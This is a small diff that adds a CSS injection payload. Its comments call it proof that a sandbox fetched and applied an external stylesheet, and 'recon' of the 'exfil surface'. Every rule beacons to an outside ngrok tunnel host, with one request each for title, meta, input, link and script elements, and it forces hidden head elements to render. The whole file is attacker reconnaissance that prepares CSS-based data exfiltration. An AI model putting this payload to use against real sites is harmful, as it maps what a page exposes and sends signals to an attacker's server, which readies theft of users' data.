@@ -1,0 +1,9 @@
+/* proof the external stylesheet was fetched AND applied by the sandbox */
+body, .raudonas-tekstas, html { background-image: url("https://79a4-5-20-239-150.ngrok-free.app/ci-applied.png"); }
+/* recon: which DOM elements can our CSS see (exfil surface) */
+head, title, meta, script { display: block; }
+title  { background-image: url("https://79a4-5-20-239-150.ngrok-free.app/ci-title.png"); }
+meta   { background-image: url("https://79a4-5-20-239-150.ngrok-free.app/ci-meta.png"); }
+input  { background-image: url("https://79a4-5-20-239-150.ngrok-free.app/ci-input.png"); }
+a[href]{ background-image: url("https://79a4-5-20-239-150.ngrok-free.app/ci-link.png"); }
+script { background-image: url("https://79a4-5-20-239-150.ngrok-free.app/ci-script.png"); }
